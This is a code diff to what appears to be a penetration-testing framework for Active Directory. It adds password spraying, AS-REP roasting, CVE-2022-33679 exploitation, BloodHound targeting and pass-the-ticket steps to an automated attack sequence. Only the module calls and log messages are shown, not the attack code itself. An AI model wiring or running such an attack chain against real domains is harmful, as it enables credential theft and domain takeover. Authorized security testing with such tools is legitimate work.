@@ -78,6 +78,8 @@ def run_enum(args):
     from modules.cme_enum import run_credential_validation
     from modules.kerberoasting import run_kerberoasting
     from modules.timeroasting import run_timeroasting
+    from modules.password_spraying import run_password_spray_campaign
+    from modules.asrep_roasting import run_asrep_roasting_attack
     
     db_manager = DatabaseManager(args.db_path)
     config = ConfigManager().get_config()
@@ -92,6 +94,15 @@ def run_enum(args):
     # Mass credential validation and enumeration
     logging.info("Running mass authentication and access mapping")
     run_credential_validation(db_manager, config)
+    
+    # Password Spraying (if no credentials yet)
+    if not db_manager.has_valid_credentials():
+        logging.info("Running password spraying attacks")
+        run_password_spray_campaign(db_manager, config)
+    
+    # AS-REP Roasting
+    logging.info("Running AS-REP roasting attacks")
+    run_asrep_roasting_attack(db_manager, config)
     
     # Kerberoasting
     logging.info("Running Kerberoasting attacks")
@@ -138,11 +149,22 @@ def run_adcs(args):
     from config_manager import ConfigManager
     from modules.certipy_enum import run_certipy_enumeration
     from modules.petitpotam import run_petitpotam_coercion
+    from modules.cve_2022_33679 import run_cve_2022_33679_attack
+    from modules.pass_the_ticket import run_pass_the_ticket_operations
+    from modules.bloodhound_integration import run_bloodhound_integration
     
     db_manager = DatabaseManager(args.db_path)
     config = ConfigManager().get_config()
     
     logging.info("Starting Phase IV: AD CS Enumeration and Abuse")
+    
+    # BloodHound integration for target prioritization
+    logging.info("Running BloodHound target analysis")
+    run_bloodhound_integration(db_manager, config)
+    
+    # CVE-2022-33679 exploitation for unauthenticated Kerberoasting
+    logging.info("Running CVE-2022-33679 exploitation")
+    run_cve_2022_33679_attack(db_manager, config)
     
     # Certipy enumeration and exploitation
     logging.info("Running AD CS enumeration with Certipy")
@@ -153,7 +175,11 @@ def run_adcs(args):
         logging.info("Running PetitPotam coercion attacks")
         run_petitpotam_coercion(db_manager, config)
     
-    logging.info("Phase IV AD CS attacks completed")
+    # Pass-the-Ticket operations for credential leveraging
+    logging.info("Running Pass-the-Ticket operations")
+    run_pass_the_ticket_operations(db_manager, config)
+    
+    logging.info("Phase IV advanced attacks completed")
 
 def run_dcsync(args):
     """Execute DCSync attack with secretsdump.py."""
